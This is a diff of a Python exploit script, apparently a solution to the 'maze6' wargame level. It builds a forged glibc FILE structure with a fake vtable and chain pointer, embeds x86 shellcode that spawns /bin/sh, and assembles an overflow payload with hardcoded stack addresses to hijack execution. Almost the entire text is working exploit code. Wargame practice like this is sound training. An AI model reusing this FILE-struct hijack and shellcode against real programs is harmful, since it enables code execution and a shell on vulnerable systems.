@@ -29,7 +29,9 @@ def fake_file(writeaddr):
     _flags = 0x0
     _vtable = 0xf7f98580
     _lock = 0xffffd07d
-    struct = p32(_flags)             #  _flags           
+    _chain = 0xf7f97c40
+    writeend = writeaddr+7
+    struct = p32(0x0)             #  _flags           
     struct += p32(0x0)               #  _IO_read_ptr   
     struct += p32(0x0)               #  _IO_read_end   
     struct += p32(0x0)               #  _IO_read_base  
@@ -37,20 +39,19 @@ def fake_file(writeaddr):
     struct += p32(0x0)               #  _IO_write_ptr  
     struct += p32(0x0)               #  _IO_write_end  
     struct += p32(writeaddr)         #  _IO_buf_base   
-    struct += p32(writeaddr+7)       #  _IO_buf_end    
+    struct += p32(writeend)       #  _IO_buf_end    
     struct += p32(0x0)               #  _IO_save_base  
     struct += p32(0x0)               #  _IO_backup_base
     struct += p32(0x0)               #  _IO_save_end   
     struct += p32(0x0)               #  _markers       
-    struct += p32(0x0)               #  _chain         
+    struct += p32(_chain)               #  _chain         
     struct += p32(0x0)               #  _fileno        
     struct += p32(0x0)               #  _flags2        
-    struct += ''                     #  _old_offset    
     struct += p32(0x0)               #  _cur_column    
-    struct += p32(_vtable)           #  _vtable_offset 
-    struct += ''                     #  _shortbuf     
+    struct += p32(0x0)               #  _vtable_offset 
     struct += p32(_lock)             #  _lock            
-    struct += p64(0xfffffffffffff)   #  _offset 
+    struct += p32(0xffffffff)   #  _offset 
+    struct += p32(0xffffffff)   #  _offset pt 2
     struct += p32(0x0)               #  __pad1           
     struct += p32(0x0)               #  __pad2           
     struct += p32(0x0)               #  __pad3           
@@ -59,12 +60,7 @@ def fake_file(writeaddr):
     struct += p32(0x0)               #  _mode            
     struct += '\x00'*40              # _unused
     struct += p32(_vtable)
-
     return struct
-
-#binary = ELF("maze6")
-#libc = ELF("/usr/lib32/libc.so.6")
-#libc.address = 0xf7da7000
 
 #GDB 'file' struct output - need to replicate
 #_IO_file_jumps vtable addr = 0xf7f98580
@@ -102,8 +98,27 @@ def fake_file(writeaddr):
 #  _mode            = 0,
 #  _unused2         = '\000' <repeats 39 times>
 #}
+#vtable addr goes at end ^
 
-writeloc = 0xffffcf4c #need to push 0xffffd071 into eax at main+147
-print(revfrob(cyclic(248) + b'\x71\xd0\xff\xff' + b'k'*12 + b'\x64\xd0\xff\xff' + 'FAKEFILE=' + fake_file(writeloc) + b'\xff\xff\xdc\x09'))
+shellcode=b'SHELLCODE=\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80'
 
+#env
+busted_loc_addr=b'\xd4\xd0\xff\xff'
+busted_addr=b'\xd1\xd0\xff\xff'
+exit_loc=0x080498dc
+writeloc = exit_loc-3
+shellcode_addr=b'\xc8\xcf\xff\xff'
+fake_file_addr=b'\xe5\xd0\xff\xff'
+#noenv
+#busted_loc_addr=b'\x94\xdb\xff\xff'
+#busted_addr=b'\x91\xdb\xff\xff'
+#shellcode_addr=b'\x88\xda\xff\xff'
+#fake_file_addr=b'\xa5\xdb\xff\xff'
+#exit_loc=0x080498dc
+#writeloc = exit_loc-3
+payload=revfrob(shellcode_addr + b'TTEST\x00' + shellcode + cyclic(197) + fake_file_addr + cyclic(12) + busted_loc_addr + b'k'*9 + 'busted\x00' + busted_addr + 'FAKEFILE=' + fake_file(writeloc) + b'tras')
+print(payload)
+args=['./maze6', 'public', payload]
+#p = process(executable="./maze6", argv=args)
+#p.interactive()
 
